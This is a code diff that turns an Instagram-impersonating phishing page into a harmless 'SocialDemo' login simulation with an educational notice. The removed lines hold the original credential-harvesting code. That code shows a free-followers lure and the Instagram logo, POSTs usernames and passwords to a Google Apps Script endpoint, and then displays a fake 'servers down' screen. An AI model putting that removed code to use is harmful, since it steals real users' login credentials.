@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>likelust.io</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SocialDemo Login Simulation</title>
   <style>
     :root {
       --bg-color: #fafafa;
@@ -26,11 +26,23 @@
       background: var(--bg-color);
       color: var(--text-color);
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
       min-height: 100vh;
       margin: 0;
       padding: 20px;
+    }
+
+    .notice {
+      background: #fff3cd;
+      color: #856404;
+      border: 1px solid #ffeeba;
+      padding: 10px 20px;
+      border-radius: 4px;
+      margin-bottom: 15px;
+      font-size: 14px;
+      text-align: center;
     }
 
     .login-box {
@@ -40,7 +52,6 @@
       width: 90%;
       max-width: 350px;
       text-align: center;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
       border-radius: 8px;
       animation: fadeIn 1s ease-in-out;
     }
@@ -48,36 +59,6 @@
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(20px); }
       to { opacity: 1; transform: translateY(0); }
-    }
-
-    .fake-url {
-      font-size: 0.8em;
-      color: #999;
-      margin-bottom: 10px;
-      word-break: break-all;
-    }
-
-    .ig-message {
-      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-      font-size: 14px;
-      color: var(--text-color);
-      font-weight: bold;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      margin-bottom: 10px;
-      animation: flashText 1.5s ease-in-out infinite alternate;
-    }
-
-    .verified-icon {
-      width: 16px;
-      height: 16px;
-    }
-
-    @keyframes flashText {
-      0% { opacity: 1; }
-      100% { opacity: 0.6; }
     }
 
     input, button {
@@ -89,38 +70,13 @@
       font-size: 16px;
       background: var(--box-bg);
       color: var(--text-color);
-      box-sizing: border-box;
     }
 
     button {
       background: #3897f0;
       color: white;
-      cursor: pointer;
       font-weight: bold;
-    }
-
-    img {
-      width: 175px;
-      margin-bottom: 20px;
-      filter: brightness(0) invert(0);
-    }
-
-    @media (prefers-color-scheme: dark) {
-      img {
-        filter: brightness(0) invert(1);
-      }
-    }
-
-    .toggle-password {
-      text-align: right;
-      margin-top: -8px;
-      font-size: 0.9em;
       cursor: pointer;
-      color: #00376b;
-    }
-
-    .toggle-password:hover {
-      text-decoration: underline;
     }
 
     .spinner {
@@ -140,9 +96,9 @@
     }
 
     .error-screen {
+      display: none;
       text-align: center;
       padding: 20px;
-      font-family: sans-serif;
     }
 
     .error-screen h1 {
@@ -153,75 +109,39 @@
     .error-screen p {
       color: #888;
     }
-
-    @media (max-width: 400px) {
-      input, button {
-        font-size: 14px;
-      }
-    }
   </style>
 </head>
 <body>
+
+  <div class="notice">
+    ⚠️ This is a simulated login page for educational demonstration only. No real data is collected.
+  </div>
+
   <div class="login-box" id="loginBox">
-    <p class="ig-message">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" alt="Verified" class="verified-icon">
-      Login With Your IG Account To Get First 2k Followers Free
-    </p>
-    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+    <h2>Login to SocialDemo</h2>
     <form id="phishForm">
-      <input type="text" id="username" name="username" autocomplete="username" placeholder="Phone number, username, or email" required>
-      <input type="password" id="password" name="password" autocomplete="current-password" placeholder="Password" required>
-      <div class="toggle-password" onclick="togglePassword()">Show Password</div>
+      <input type="text" placeholder="Username or email" required />
+      <input type="password" placeholder="Password" required />
       <button type="submit">Log In</button>
     </form>
     <div class="spinner" id="spinner"></div>
   </div>
 
-  <div class="error-screen" id="errorScreen" style="display:none;">
-    <h1>404</h1>
-    <p>LikeLust Servers are Currently Down. Please try again later.</p>
+  <div class="error-screen" id="errorScreen">
+    <h1>Server Down</h1>
+    <p>Our demo servers are currently unavailable. Please try again later.</p>
   </div>
 
   <script>
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbxeeRW76Vn8MfC_DgnfMxxvuGaJyQzmVgeFofR6nCu5wSknftS59ztgCnvHm12MYmjW/exec';
-
     document.getElementById('phishForm').addEventListener('submit', function(e) {
       e.preventDefault();
-
       document.getElementById('spinner').style.display = 'block';
 
-      const data = {
-        username: document.getElementById('username').value,
-        password: document.getElementById('password').value
-      };
-
-      fetch(scriptURL, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-      });
-
-      // Delay to mimic real login
       setTimeout(() => {
         document.getElementById('loginBox').style.display = 'none';
         document.getElementById('errorScreen').style.display = 'block';
-      }, 4000); // wait 4 seconds
+      }, 3500); // Simulate delay
     });
-
-    function togglePassword() {
-      const pwd = document.getElementById('password');
-      const toggle = document.querySelector('.toggle-password');
-      if (pwd.type === 'password') {
-        pwd.type = 'text';
-        toggle.textContent = 'Hide Password';
-      } else {
-        pwd.type = 'password';
-        toggle.textContent = 'Show Password';
-      }
-    }
   </script>
 </body>
 </html>
